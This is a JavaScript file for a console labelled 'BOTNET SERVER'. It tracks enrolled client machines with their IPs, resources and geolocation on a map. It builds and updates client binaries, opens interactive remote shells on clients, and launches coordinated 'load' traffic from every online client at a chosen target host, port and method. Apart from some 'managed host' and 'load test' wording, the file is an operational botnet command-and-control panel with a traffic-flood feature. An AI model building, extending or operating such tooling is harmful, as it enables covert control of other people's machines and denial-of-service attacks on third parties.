const $ = (selector) => document.querySelector(selector);
const escape = (value) =>
  String(value).replace(
    /[&<>"']/g,
    (c) =>
      ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[
        c
      ],
  );
const ns = "http://www.w3.org/2000/svg";
let state,
  selectedID = "",
  currentView = "overview";
let tickPending = false,
  toastTimer,
  requestQueue = Promise.resolve();
const pageSize = 100;
let clientPage = 0, versionPage = 0, renderTimer, lastScroll = 0;
let detailTab = "info", shellAgentID = "", shellPollTimer;
const rendered = new Map();
function renderSection(name, data, draw) {
  const signature = JSON.stringify(data);
  if (rendered.get(name) === signature) return;
  rendered.set(name, signature);
  draw();
}
window.addEventListener("scroll", () => { lastScroll = performance.now(); }, { passive: true });
function scheduleRender() {
  if (renderTimer) return;
  renderTimer = setTimeout(() => {
    renderTimer = null;
    if (performance.now() - lastScroll < 120) { scheduleRender(); return; }
    requestAnimationFrame(render);
  }, 100);
}

function api(method, ...args) {
  const request = async () => {
    const bridge = window.go?.main?.App;
    if (bridge) return bridge[method](...args);
    if (location.hostname !== "127.0.0.1" || location.port !== "34115") {
      throw new Error(
        "Desktop bridge unavailable. Start the console or the local development preview.",
      );
    }
    const names = {
      BuildClient: ["extraServers", "goos"],
      BuildClientConfigured: ["extraServers", "config"],
      SaveSettings: ["settings"],
      Revoke: ["id"],
      UpdateClient: ["id"],
      AddSite: ["name", "cidr", "lat", "lon"],
      RemoveSite: ["cidr"],
      StartLoad: ["target", "port", "method", "percent", "duration"],
      ShellOpen: ["id", "cols", "rows"],
      ShellWrite: ["id", "data"],
      ShellClose: ["id"],
      ShellDrain: ["id"],
      ShellResize: ["id", "cols", "rows"],
    };
    const body = Object.fromEntries(
      (names[method] || []).map((name, index) => [name, args[index]]),
    );
    const response = await fetch(`/api/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const result = await response.json();
    if (!response.ok)
      throw new Error(result.error || "Console request failed");
    return result;
  };
  const result = requestQueue.then(request);
  requestQueue = result.catch(() => {});
  return result;
}

function notify(message) {
  $("#toast").textContent = message;
  $("#toast").hidden = false;
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => {
    $("#toast").hidden = true;
  }, 4500);
}
async function mutate(method, ...args) {
  try {
    state = await api(method, ...args);
    render();
    return true;  } catch (error) {
    notify(String(error.message || error));
    return false;
  }
}
function formatBytes(bytes) {
  const units = ["B", "KB", "MB", "GB", "TB"];
  let n = Number(bytes) || 0,
    i = 0;
  while (n >= 1000 && i < units.length - 1) {
    n /= 1000;
    i++;
  }
  return [
    n.toLocaleString("en-US", { maximumFractionDigits: i ? 1 : 0 }),
    units[i],
  ];
}
function statusHTML(agent) {
  const label = agent.status[0].toUpperCase() + agent.status.slice(1);
  return `<span class="status ${escape(agent.status)}"><span class="dot"></span>${escape(label)}</span>`;
}
function isOutdated(agent) {
  return agent.version !== state.clientVersion;
}
function displayVersion(version) {
  return escape(String(version).startsWith("v") ? version : `v${version}`);
}
function currentAgent() {
  return state?.agents.find((agent) => agent.id === selectedID);
}
function duration(seconds) {
  const safe = Math.max(0, seconds | 0);
  return `${String(Math.floor(safe / 60)).padStart(2, "0")}:${String(safe % 60).padStart(2, "0")}`;
}
function memoryLabel(agent) {
  if (!agent.memTotal) return "—";
  return `${formatBytes(agent.memUsed).join(" ")} / ${formatBytes(agent.memTotal).join(" ")}`;
}

function render() {
  if (!state) return;
  $("#server-version").textContent = `BOTNET SERVER // v${state.serverVersion}`;
  $("#client-release").textContent = `Client release ${state.clientVersion}`;
  $("#build-latest-version").textContent = state.clientVersion;
  const agents = state.agents || [];
  const onlineAgents = agents.filter((agent) => agent.status === "online");
  const offlineCount = agents.length - onlineAgents.length;
  $("#clear-offline-clients").textContent = `Clear all offline clients (${offlineCount})`;
  $("#clear-offline-clients").disabled = offlineCount === 0;
  const outdated = agents.filter(isOutdated).length;
  const cpu = onlineAgents.length
    ? onlineAgents.reduce((sum, agent) => sum + agent.cpu, 0) /
      onlineAgents.length
    : 0;
  const memory = onlineAgents.reduce((sum, agent) => sum + agent.memUsed, 0);
  const [memNumber, memUnit] = formatBytes(memory);
  const bandwidth = onlineAgents.reduce((sum, agent) => sum + (agent.bandwidthMbps || 0), 0);
  const measured = onlineAgents.filter((agent) => agent.bandwidthMbps > 0).length;
  $("#bandwidth-value").textContent = measured ? Math.round(bandwidth).toLocaleString("en-US") : "—";
  $("#bandwidth-note").textContent = measured
    ? `Sum of ${measured} measured client download ${measured === 1 ? "speed" : "speeds"}`
    : "Clients measure their download speed periodically";
  $("#online-count").textContent = onlineAgents.length;
  $("#total-count").textContent = `/ ${agents.length}`;
  $("#nav-count").textContent = agents.length;
  $("#online-note").textContent = agents.length
    ? `${agents.length - onlineAgents.length} offline`
    : "No agents enrolled";
  $("#cpu-value").textContent = onlineAgents.length ? cpu.toFixed(1) : "—";
  $("#mem-value").textContent = onlineAgents.length ? memNumber : "—";
  $("#mem-unit").textContent = memUnit;
  $("#version-value").textContent = agents.length
    ? Math.round(((agents.length - outdated) / agents.length) * 100)
    : "—";
  $("#outdated-note").textContent = agents.length
    ? `${outdated} on an earlier version`
    : "No agents enrolled";
  $("#registry-count").textContent = `${agents.length} AGENTS`;
  $("#chart-rate").textContent = onlineAgents.length;
  $("#regions-count").textContent = onlineAgents.length;
  $("#running-label").textContent = state.listenerError ? "DOWN" : "LISTENING";
  $("#link-label").textContent = state.listenerError ? "DOWN" : "LISTENING";
  $("#listen-label").textContent = state.listenerError ? "DOWN" : "OPEN";
  $("#listen-state").textContent = state.listenerError ? "ERROR" : "READY";
  $("#listen-note").textContent =
    state.listenerError || state.advertiseURL || "Address pending";
  $("#session-time").textContent = duration(state.elapsed);
  if (currentView === "overview" || currentView === "clients") renderSection("table", [agents, state.clientVersion, clientPage, $("#search").value, $("#status-filter").value], renderTable);
  if (currentView === "overview") {
    renderSection("map", [state.points, state.unplaced, onlineAgents.length], renderMap);
    renderSection("chart", state.history, renderChart);
    renderSection("recent-events", state.events, renderEvents);
  }
  if (currentView === "events") renderSection("full-events", state.events, renderEvents);
  if (currentView === "versions") renderSection("versions", [agents, state.clientVersion, versionPage], renderVersions);
  if (currentView === "overview") renderSection("load", [state.load, state.agents], renderLoadPanel);
  if ($("#client-dialog").open) renderDetail();
}

function renderTable() {
  const query = $("#search").value.toLowerCase().trim(),
    filter = $("#status-filter").value;
  const agents = state.agents.filter(
    (agent) =>
      `${agent.hostname} ${agent.id} ${agent.os} ${agent.arch} ${agent.remote} ${agent.version}`
        .toLowerCase()
        .includes(query) &&
      (filter === "all" ||
        (filter === "outdated" && isOutdated(agent)) ||
        agent.status === filter),
  );
  const focusID = document.activeElement?.closest("#client-rows [data-inspect]")
    ?.dataset.inspect;
  const pages = Math.max(1, Math.ceil(agents.length / pageSize));
  clientPage = Math.min(clientPage, pages - 1);
  const visible = agents.slice(clientPage * pageSize, (clientPage + 1) * pageSize);
  $("#client-rows").innerHTML = agents.length
    ? visible
        .map(
          (agent) => `<tr>
    <td><div class="client-cell"><span class="os-mark" aria-hidden="true">${agent.os === "windows" ? "⊞" : "⌘"}</span><div><strong>${escape(agent.hostname)}</strong><small>${escape(agent.os)}/${escape(agent.arch)} · ${escape(agent.id)}</small></div></div></td>
    <td class="address">${escape(agent.remote || "—")}</td>
    <td>${statusHTML(agent)}</td>
    <td class="${isOutdated(agent) ? "version-outdated" : "muted"}">${displayVersion(agent.version)}${isOutdated(agent) ? "<span>↥</span>" : ""}</td>
    <td class="rate-cell">${agent.status === "online" ? `${agent.cpu.toFixed(1)}%` : "—"}</td>
    <td class="rate-cell">${agent.status === "online" ? memoryLabel(agent) : "—"}</td>
    <td class="rate-cell">${agent.bandwidthMbps > 0 ? `${Math.round(agent.bandwidthMbps).toLocaleString("en-US")} Mbps` : "—"}</td>
    <td><button class="inspect-button" data-inspect="${escape(agent.id)}" aria-label="Inspect ${escape(agent.hostname)}">↗</button></td></tr>`,
        )
        .join("")
    : `<tr><td colspan="8" class="empty-row">${state.agents.length ? "No agents match these filters." : "No agents yet. Build a client and run it on a managed host."}</td></tr>`;
  if (focusID)
    $(`#client-rows [data-inspect="${focusID}"]`)?.focus({
      preventScroll: true,
    });
  $("#table-summary").textContent = `Showing ${agents.length ? clientPage * pageSize + 1 : 0}–${Math.min((clientPage + 1) * pageSize, agents.length)} of ${agents.length} matching · ${state.agents.length} total`;
  $("#clients-page").textContent = `${clientPage + 1} / ${pages}`;
  $("#clients-prev").disabled = clientPage === 0;
  $("#clients-next").disabled = clientPage === pages - 1;
  $("#update-all-clients").disabled = !state.agents.some(agent => agent.status === "online" && agent.updateCapable && isOutdated(agent) && !["Queued", "Installing"].includes(agent.updateStatus));
}

function project(lon, lat) {
  return [((lon + 180) / 360) * 1000, ((90 - lat) / 180) * 470];
}

// unproject converts a click inside the atlas back to coordinates.
function unproject(x, y) {
  const lon = (x / 1000) * 360 - 180;
  const lat = 90 - (y / 470) * 180;
  return [
    Math.max(-180, Math.min(180, lon)),
    Math.max(-90, Math.min(90, lat)),
  ];
}

// suggestCIDR guesses the /24 around an address so the field is not blank.
function suggestCIDR(address) {
  const parts = String(address).split(".");
  if (parts.length !== 4) return "";
  return `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
}
function svgElement(tag, attrs) {
  const element = document.createElementNS(ns, tag);
  for (const [key, value] of Object.entries(attrs))
    element.setAttribute(key, value);
  return element;
}
async function loadLand() {
  try {
    const response = await fetch("world.json");
    if (!response.ok) throw new Error("Botnet asset unavailable");
    const data = await response.json();
    for (const feature of data.features) {
      const polygons =
        feature.geometry.type === "MultiPolygon"
          ? feature.geometry.coordinates
          : [feature.geometry.coordinates];
      const d = polygons
        .map((polygon) =>
          polygon
            .map(
              (ring) =>
                ring
                  .map(([lon, lat], i) => {
                    const [x, y] = project(lon, lat);
                    return `${i ? "L" : "M"}${x.toFixed(1)},${y.toFixed(1)}`;
                  })
                  .join("") + "Z",
            )
            .join(""),
        )
        .join("");
      $("#land").append(svgElement("path", { d, class: "map-land" }));
    }
  } catch (error) {
    notify(error.message);
  }
}
function renderMap() {
  const markers = $("#markers");
  markers.replaceChildren();
  $("#routes").replaceChildren();
  const points = state.points || [];
  const online = (state.agents || []).filter(
    (agent) => agent.status === "online",
  );
  $("#regions-count").textContent = online.length;
  const placed = points.reduce((sum, point) => sum + point.total, 0);
  $("#point-summary").textContent = points.length
    ? `· ${points.length} ${points.length === 1 ? "location" : "locations"} · ${placed} placed`
    : "· no location";
  const unplaced = state.unplaced || 0;
  $("#geo-caption").innerHTML = points.length
    ? `<span class="dot"></span> ${points.length} ${points.length === 1 ? "LOCATION" : "LOCATIONS"}`
    : `<span class="dot"></span> NO COORDINATES`;
  $("#geo-note").textContent = unplaced
    ? "Clients resolve their public IP location; unavailable locations are grouped below"
    : "Locations reported automatically by clients";
  $("#unlocated-clients").hidden = unplaced === 0;
  $("#unlocated-count").textContent = unplaced;

  for (const point of points) {
    const [x, y] = project(point.lon, point.lat);
    const group = svgElement("g", {
      class: "map-marker",
      role: "button",
      tabindex: "0",
      "aria-label": `${point.name}: ${point.total} ${point.total === 1 ? "agent" : "agents"}`,
      transform: `translate(${x.toFixed(1)} ${y.toFixed(1)})`,
    });
    // Larger dots for bigger groups, capped so they stay readable.
    const radius = Math.min(16, 6 + Math.log2(point.total + 1) * 2.6);
    group.append(
      svgElement("circle", {
        class: "marker-ring",
        r: radius.toFixed(1),
      }),
      svgElement("circle", { class: "marker-core", r: "2.6" }),
    );
    const count = svgElement("text", {
      class: "marker-count",
      x: (radius + 4).toFixed(1),
      y: "4",
    });
    count.textContent = String(point.total);
    group.append(count);
    const title = svgElement("title", {});
    title.textContent = `${point.name}\n${point.total} ${point.total === 1 ? "agent" : "agents"}\n${point.hosts.join(", ")}`;
    group.append(title);
    markers.append(group);
  }
}
function renderChart() {
  const values = state.history?.length ? state.history : [0];
  const max = Math.max(1, ...values);
  const points = values.map((value, i) => [
    (i / Math.max(1, values.length - 1)) * 360,
    140 - (value / max) * 130,
  ]);
  const d = points
    .map(([x, y], i) => `${i ? "L" : "M"}${x.toFixed(1)},${y.toFixed(1)}`)
    .join(" ");
  $("#chart-line").setAttribute("d", d);
  $("#chart-area").setAttribute("d", `${d} L360,145 L0,145 Z`);
  $("#throughput-chart").setAttribute(
    "aria-label",
    `${$("#chart-rate").textContent} agents online. Last ${values.length} seconds.`,
  );
}
function renderEvents() {
  const events = state.events || [];
  $("#recent-events").innerHTML = events.length
    ? events
        .slice(0, 3)
        .map(
          (event) =>
            `<div class="recent-event"><span class="dot ${escape(event.kind)}"></span><div><p>${escape(event.message)}</p><time>${escape(event.time)}</time></div></div>`,
        )
        .join("")
    : `<div class="recent-event"><div><p>No events yet.</p></div></div>`;
  $("#full-events").innerHTML = events.length
    ? events
        .map(
          (event) =>
            `<div class="log-event"><time>${escape(event.time)}</time><span class="event-kind ${escape(event.kind)}">${escape(event.kind.toUpperCase())}</span><p>${escape(event.message)}</p></div>`,
        )
        .join("")
    : `<div class="log-event"><p>No events yet.</p></div>`;
}
function renderVersions() {
  const pages = Math.max(1, Math.ceil(state.agents.length / pageSize));
  versionPage = Math.min(versionPage, pages - 1);
  $("#version-list").innerHTML = state.agents.length
    ? state.agents.slice(versionPage * pageSize, (versionPage + 1) * pageSize)
        .map(
          (agent) =>
            `<div class="version-row"><strong>${escape(agent.hostname)}</strong><span class="${isOutdated(agent) ? "version-outdated" : "muted"}">${displayVersion(agent.version)}</span><span class="muted">${isOutdated(agent) ? "Earlier version" : "Current release"}</span>${statusHTML(agent)}</div>`,
        )
        .join("")
    : `<div class="version-row"><span class="muted">No agents enrolled.</span></div>`;
  $("#versions-page").textContent = `${versionPage + 1} / ${pages}`;
  $("#versions-prev").disabled = versionPage === 0;
  $("#versions-next").disabled = versionPage === pages - 1;
}
function setView(view) {
  currentView = view;
  document.body.dataset.view = view;
  const copy = {
    overview: [
      "Network overview",
      "Enrolled agents report hostname, OS, CPU, and memory.",
    ],
    clients: [
      "Agent registry",
      "Machines running a client built for this console.",
    ],
    versions: [
      "Version manager",
      "Reported build versions. Replace the agent binary on that machine to change it.",
    ],
    events: [
      "Event log",
      "Enrollment, heartbeats lost, and revocations for this console session.",
    ],
    settings: ["Server settings", "Listener configuration and defaults for new client builds."],
  };
  if (!copy[view]) return;
  $("#page-title").replaceChildren(document.createTextNode(copy[view][0]));
  const period = document.createElement("span");
  period.className = "accent";
  period.textContent = ".";
  $("#page-title").append(period);
  $("#page-description").textContent = copy[view][1];
  $("#breadcrumb").textContent =
    view === "overview" ? "Overview" : copy[view][0];
  for (const name of ["overview", "clients", "versions", "events", "settings"])
    $(`#${name}-view`).hidden =
      name !== view && !(name === "clients" && view === "overview");
  document.querySelectorAll(".nav-item").forEach((item) => {
    item.classList.toggle("active", item.dataset.view === view);
    if (item.dataset.view === view) item.setAttribute("aria-current", "page");
    else item.removeAttribute("aria-current");
  });
  if (view === "settings") renderSettings();
  render();
}

function renderDetail() {
  const agent = currentAgent();
  if (!agent) return;
  $("#detail-name").textContent = agent.hostname;
  $("#detail-meta").innerHTML = `${statusHTML(agent)}<span>${escape(agent.os)}/${escape(agent.arch)}</span><span>${escape(agent.remote || "—")}</span><span>${displayVersion(agent.version)}</span>`;
  document.querySelectorAll("[data-detail-tab]").forEach((tab) => {
    tab.classList.toggle("selected", tab.dataset.detailTab === detailTab);
  });
  $("#detail-info").hidden = detailTab !== "info";
  $("#detail-shell").hidden = detailTab !== "shell";
  const rows = [
    ["Last heartbeat", agent.lastSeen],
    ["CPU", agent.status === "online" ? `${agent.cpu.toFixed(1)}%` : "—"],
    ["Memory", agent.status === "online" ? memoryLabel(agent) : "—"],
    ["Uptime", duration(agent.uptime)],
    ["Bandwidth", agent.bandwidthMbps > 0 ? `${Math.round(agent.bandwidthMbps).toLocaleString("en-US")} Mbps measured download` : "Not measured yet"],
    ["Load sent", agent.loadBytes > 0 ? formatBytes(agent.loadBytes).join(" ") : "—"],
    ["Version", agent.version],
    ["Location", agent.site || "Location unavailable"],
    ["Location source", { client: "Client public-IP lookup", geo: "Connection IP (legacy client)", declared: "Network override" }[agent.geoBy] || "Awaiting client lookup"],
    ["Updates", agent.updateStatus || (agent.updateCapable ? "Ready" : "Manual replacement required to enable updates")],
    ["Update request ID", agent.updateRequestId || "—"],
    ["Agent id", agent.id],
  ];
  $("#detail-metrics").innerHTML = rows
    .map(
      ([label, value]) =>
        `<dt>${escape(label)}</dt><dd>${escape(value)}</dd>`,
    )
    .join("");
  const update = $("#update-agent");
  update.textContent = `Update to ${state.clientVersion}`;
  update.disabled = agent.status !== "online" || !agent.updateCapable || !isOutdated(agent) || ["Queued", "Installing"].includes(agent.updateStatus);
  syncShellUI(agent);
}

// The remote shell speaks raw PTY protocol: escape sequences, cursor
// movement, split UTF-8. Render it with a real terminal emulator (xterm.js,
// vendored) instead of appending plain text, which garbles redraws.
let shellTerm = null,
  shellFit = null,
  shellCols = 0,
  shellRows = 0,
  shellOpening = false,
  shellReady = false;

function fitShellTerm() {
  if (!shellTerm || !shellFit) return;
  try {
    shellFit.fit();
  } catch (_) {
    return; // hidden container has no measurable size yet
  }
  const { cols, rows } = shellTerm;
  if (!cols || !rows || (cols === shellCols && rows === shellRows)) return;
  shellCols = cols;
  shellRows = rows;
  if (shellReady && shellAgentID) void api("ShellResize", shellAgentID, cols, rows).catch(() => {});
}

function ensureShellTerm() {
  if (shellTerm) return shellTerm;
  const host = $("#terminal-output");
  shellTerm = new Terminal({
    cursorBlink: true,
    cursorStyle: "bar",
    disableStdin: false,
    scrollback: 5000,
    fontSize: 13,
    fontFamily: "DejaVu Sans Mono, Liberation Mono, monospace",
    theme: {
      background: "#000000",
      foreground: "#8ef0a4",
      cursor: "#8ef0a4",
      cursorAccent: "#000000",
      selectionBackground: "#1c6b38",
    },
  });
  shellFit = new FitAddon.FitAddon();
  shellTerm.loadAddon(shellFit);
  shellTerm.open(host);
  shellTerm.onData((data) => {
    if (!shellAgentID || !data) return;
    void api("ShellWrite", shellAgentID, data).catch((error) => {
      notify(String(error.message || error));
    });
  });
  window.__botnetShellTerm = shellTerm; // tests and debugging
  fitShellTerm();
  new ResizeObserver(fitShellTerm).observe(host);
  host.addEventListener("mousedown", () => shellTerm.focus());
  return shellTerm;
}

function shellBytes(dataB64) {
  const binary = atob(dataB64);
  return Uint8Array.from(binary, (c) => c.charCodeAt(0));
}

function appendShellOutput(dataB64, errText) {
  const term = ensureShellTerm();
  if (dataB64) term.write(shellBytes(dataB64));
  if (errText) term.write(`\r\n\x1b[2m[${errText}]\x1b[0m\r\n`);
}

async function openShell(agent) {
  if (!agent || agent.status !== "online") return;
  if (shellAgentID === agent.id || shellOpening) return;
  if (typeof Terminal !== "function") {
    $("#shell-notice").hidden = false;
    $("#shell-notice").textContent = "Terminal view failed to load.";
    return;
  }
  shellOpening = true;
  shellReady = false;
  shellAgentID = agent.id;
  const term = ensureShellTerm();
  term.reset();
  const name = String(agent.hostname || "client").replace(/[^\x20-\x7e]/g, "");
  term.write(`\x1b[32mconnecting to ${name}…\x1b[0m\r\n`);
  shellCols = 0;
  shellRows = 0;
  $("#shell-notice").hidden = true;
  $("#terminal-output").scrollIntoView({ block: "nearest" });
  try {
    fitShellTerm();
    await api("ShellOpen", agent.id, term.cols || 80, term.rows || 24);
    if (shellAgentID !== agent.id) return;
    shellReady = true;
    shellCols = term.cols;
    shellRows = term.rows;
    startShellPoll(agent.id);
    await drainShell(agent.id);
    requestAnimationFrame(() => {
      fitShellTerm();
      term.focus();
    });
  } catch (error) {
    if (shellAgentID === agent.id) {
      shellAgentID = "";
      shellReady = false;
    }
    $("#shell-notice").hidden = false;
    $("#shell-notice").textContent = String(error.message || error);
    term.write(`\r\n[${error.message || error}]\r\n`);
  } finally {
    shellOpening = false;
  }
}

async function closeShell() {
  stopShellPoll();
  const id = shellAgentID;
  shellAgentID = "";
  shellReady = false;
  shellOpening = false;
  if (!id) return;
  try {
    await api("ShellClose", id);
  } catch (_) {}
}

function stopShellPoll() {
  if (shellPollTimer) {
    clearInterval(shellPollTimer);
    shellPollTimer = null;
  }
}

async function drainShell(id) {
  if (shellAgentID !== id) return;
  const events = await api("ShellDrain", id);
  for (const ev of events || []) {
    if (shellAgentID !== id) return;
    if (ev.closed) {
      appendShellOutput("", ev.error || "Shell session ended.");
      shellAgentID = "";
      shellReady = false;
      stopShellPoll();
      return;
    }
    appendShellOutput(ev.data);
  }
}

function startShellPoll(id) {
  stopShellPoll();
  shellPollTimer = setInterval(() => {
    drainShell(id).catch(() => {});
  }, 100);
}

function syncShellUI(agent) {
  if (detailTab !== "shell") return;
  if (agent.status !== "online") {
    $("#shell-notice").hidden = false;
    $("#shell-notice").textContent = "Client must be online to open a shell.";
    return;
  }
  if (shellAgentID === agent.id || shellOpening) return;
  void openShell(agent);
}

$("#client-dialog").addEventListener("close", () => {
  void closeShell();
  detailTab = "info";
});
$("#shell-close").addEventListener("click", () => void closeShell());
document.addEventListener("click", (event) => {
  const button = event.target.closest("button,[data-inspect]");
  if (!button || button.disabled) return;
  if (button.dataset.view) setView(button.dataset.view);
  if (button.dataset.close) $(`#${button.dataset.close}`).close();
  if (button.dataset.inspect) {
    selectedID = button.dataset.inspect;
    detailTab = "info";
    shellAgentID = "";
    renderDetail();
    $("#client-dialog").showModal();
  }
  if (button.dataset.detailTab) {
    detailTab = button.dataset.detailTab;
    renderDetail();
  }
});
$("#markers").addEventListener("keydown", () => {});
document
  .querySelector(".brand")
  .addEventListener("click", () => setView("overview"));
$("#stat-update").addEventListener("click", () => setView("versions"));
$("#search").addEventListener("input", () => {
  clientPage = 0;
  if (state) renderTable();
});
$("#status-filter").addEventListener("change", () => {
  clientPage = 0;
  if (state) renderTable();
});
for (const [id, delta] of [["clients-prev", -1], ["clients-next", 1]]) $("#" + id).addEventListener("click", () => { clientPage += delta; renderTable(); });
for (const [id, delta] of [["versions-prev", -1], ["versions-next", 1]]) $("#" + id).addEventListener("click", () => { versionPage += delta; renderVersions(); });
function fillClientOptions(prefix, config) {
  $("#" + prefix + "-retry").value = config.retrySeconds;
  $("#" + prefix + "-max-retry").value = config.maxRetrySeconds;
  $("#" + prefix + "-heartbeat").value = config.heartbeatSeconds;
  $("#" + prefix + "-timeout").value = config.connectTimeoutSeconds;
}
function readClientOptions(prefix) {
  return { retrySeconds: Number($("#" + prefix + "-retry").value), maxRetrySeconds: Number($("#" + prefix + "-max-retry").value), heartbeatSeconds: Number($("#" + prefix + "-heartbeat").value), connectTimeoutSeconds: Number($("#" + prefix + "-timeout").value) };
}
function renderSettings() {
  const settings = state.settings;
  if (!settings) return;
  $("#settings-listen").value = settings.listenAddr;
  $("#settings-advertise").value = settings.advertiseURL;
  $("#settings-max").value = settings.maxClients;
  fillClientOptions("settings", settings.clientDefaults);
}
$("#load-button").addEventListener("click", () => {
  $("#load-form").reset();
  $("#load-error").textContent = "";
  $("#load-dialog").showModal();
  $("#load-target").focus();
});
function renderLoadPanel() {
  const load = state.load || { active: false, agents: 0, totalBytes: 0, totalRateBps: 0 };
  const task = load.task;
  $("#load-panel").hidden = !task;
  if (!task) return;
  $("#load-state-label").textContent = load.active ? "RUNNING" : "FINISHED";
  $("#load-status").textContent = load.active ? "Running" : "Finished";
  $("#load-agents").textContent = load.agents || 0;
  $("#load-rate").textContent = `${formatBytes(load.totalRateBps || 0).join(" ")}/s`;
  $("#load-total").textContent = formatBytes(load.totalBytes || 0).join(" ");
  $("#load-summary").textContent =
    `${load.active ? "Running" : "Last run"} ${task.id} · ${task.method} → ${task.target}:${task.port} · ${task.percent}% for ${task.durationSeconds}s` +
    (load.active && load.endsAt ? ` · ends ${load.endsAt}` : "") +
    " · per-client throughput from heartbeat reports.";
  $("#stop-load").disabled = !load.active;
  const senders = (state.agents || []).filter(agent => agent.loadBytes > 0);
  $("#load-rows").innerHTML = senders.length
    ? senders.slice(0, 50).map(agent => `<tr><td>${escape(agent.hostname)}</td><td>${statusHTML(agent)}</td><td>${agent.loadRateBps > 0 ? `${formatBytes(agent.loadRateBps).join(" ")}/s` : "—"}</td><td>${formatBytes(agent.loadBytes).join(" ")}</td></tr>`).join("")
    : `<tr><td colspan="4" class="empty-row">No client counters yet. Clients report sent bytes with each heartbeat.</td></tr>`;
}
$("#load-form").addEventListener("submit", async event => {
  event.preventDefault();
  $("#load-error").textContent = "";
  const submit = event.submitter;
  submit.disabled = true;
  try {
    state = await api("StartLoad", $("#load-target").value, Number($("#load-port").value), $("#load-method").value, Number($("#load-percent").value), Number($("#load-duration").value));
    $("#load-dialog").close();
    render();
    notify("Load test queued. Online clients start at their next heartbeat and stop at the deadline.");
  } catch (error) { $("#load-error").textContent = String(error.message || error); }
  finally { submit.disabled = false; }
});
$("#stop-load").addEventListener("click", async () => {
  if (!confirm("Cancel the running load test? Clients stop at their next heartbeat.")) return;
  await mutate("StopLoad");
});
$("#clear-offline-clients").addEventListener("click", async event => {
  const count = state.agents.filter(agent => agent.status === "offline").length;
  if (!count || !confirm(`Remove ${count} offline ${count === 1 ? "client" : "clients"} from the saved registry? Connected clients will be kept. Removed clients must re-enroll before reconnecting.`)) return;
  const button = event.currentTarget;
  button.disabled = true;
  try {
    const result = await api("ClearOfflineClients");
    state = result.snapshot;
    render();
    const removed = result.removed;
    $("#settings-status").textContent = `Cleared ${removed} offline ${removed === 1 ? "client" : "clients"}. Connected clients were kept.`;
    $("#settings-status").hidden = false;
    notify("Offline clients cleared.");
  } catch (error) {
    $("#settings-error").textContent = String(error.message || error);
  } finally { render(); }
});
$("#settings-form").addEventListener("submit", async event => {
  event.preventDefault();
  const submit = event.submitter;
  submit.disabled = true;
  $("#settings-error").textContent = "";
  $("#settings-status").hidden = true;
  try {
    state = await api("SaveSettings", { listenAddr: $("#settings-listen").value, advertiseURL: $("#settings-advertise").value, maxClients: Number($("#settings-max").value), clientDefaults: readClientOptions("settings") });
    render();
    $("#settings-status").textContent = state.restartRequired ? "Settings saved. Restart the console to apply the listen address." : "Settings saved successfully.";
    $("#settings-status").hidden = false;
  } catch (error) { $("#settings-error").textContent = String(error.message || error); }
  finally { submit.disabled = false; }
});
function openBuildDialog() {
  if (!state) return;
  $("#add-form").reset();
  $("#form-error").textContent = "";
  $("#build-result").hidden = true;
  fillClientOptions("build", state.settings?.clientDefaults || { retrySeconds: 10, maxRetrySeconds: 60, heartbeatSeconds: 15, connectTimeoutSeconds: 5 });
  $("#add-form button[type=submit]").textContent = "Build client";
  $("#add-dialog").showModal();
  $("#extra-servers").focus();
}
$("#add-button").addEventListener("click", openBuildDialog);
$("#build-client-versions").addEventListener("click", openBuildDialog);
$("#add-form").addEventListener("submit", async (event) => {
  event.preventDefault();
  const submit = event.submitter;
  submit.disabled = true;
  submit.textContent = "Building release…";
  try {
    const result = await api(
      "BuildClientConfigured",
      $("#extra-servers").value,
      readClientOptions("build"),
    );
    const path = result.path || result;
    $("#build-path").value = path;
    $("#build-result").hidden = false;
    $("#form-error").textContent = "";
    state = await api("Snapshot");
    render();
    $("#build-success").textContent = `Client ${state.clientVersion} created successfully. Linux and Windows binaries are ready.`;
    submit.textContent = "Build another release";
    notify("Release built for Linux and Windows. Copy the matching binary to each managed host.");
  } catch (error) {
    $("#form-error").textContent = String(error.message || error);
    submit.textContent = "Build client";
  } finally {
    submit.disabled = false;
  }
});
$("#revoke-agent").addEventListener("click", async () => {
  const agent = currentAgent();
  if (!agent) return;
  if (!confirm(`Revoke ${agent.hostname}? It will stop appearing after its next heartbeat is rejected.`))
    return;
  if (await mutate("Revoke", agent.id)) $("#client-dialog").close();
});
$("#update-agent").addEventListener("click", async () => {
  const agent = currentAgent();
  if (!agent || !confirm(`Send signed ${state.clientVersion} to ${agent.hostname} and restart its monitoring client?`)) return;
  if (await mutate("UpdateClient", agent.id)) notify("Update queued. The client will verify, install and reconnect automatically.");
});
$("#update-all-clients").addEventListener("click", async event => {
  if (!confirm(`Update all eligible online clients to ${state.clientVersion}? Clients will restart after verifying the signed release. Offline, current and legacy clients are skipped.`)) return;
  const button = event.currentTarget;
  button.disabled = true;
  try {
    const result = await api("UpdateAllClients");
    state = result.snapshot;
    render();
    notify(`Updates queued for ${result.queued} clients; ${result.skipped} skipped. Transfers are limited to 8 at a time.`);
  } catch (error) { notify(String(error.message || error)); }
  finally { rendered.delete("table"); render(); }
});
function renderSites() {
  const sites = state.sites || [];
  $("#site-list").innerHTML = sites.length
    ? sites
        .map(
          (site) =>
            `<div class="site-row"><strong>${escape(site.name)}</strong><span>${escape(site.cidr)}</span><span class="muted">${site.lat.toFixed(2)}, ${site.lon.toFixed(2)}</span><button class="text-button" data-remove-site="${escape(site.cidr)}" type="button">Remove</button></div>`,
        )
        .join("")
    : `<p class="muted">No declared locations yet.</p>`;
}
$("#manage-locations").addEventListener("click", () => {
  $("#locations-error").textContent = "";
  renderSites();
  const host = state.agents.find(agent => !agent.site && agent.status === "online");
  if (!$("#site-cidr").value && host?.remote) $("#site-cidr").value = suggestCIDR(host.remote);
  $("#locations-dialog").showModal();
  $("#site-name").focus();
});

// Picking a point is easier than typing coordinates. The dialog closes so the
// map is clickable, and the chosen position fills the latitude/longitude.
let picking = false;
$("#pick-on-map").addEventListener("click", () => {
  picking = true;
  $("#locations-dialog").close();
  setView("overview");
  $("#placing-hint").hidden = false;
  $("#atlas").classList.add("placing");
});
$("#cancel-place").addEventListener("click", () => {
  picking = false;
  $("#placing-hint").hidden = true;
  $("#atlas").classList.remove("placing");
});
$("#atlas").addEventListener("click", (event) => {
  if (!picking) return;
  const svg = $("#atlas");
  const rect = svg.getBoundingClientRect();
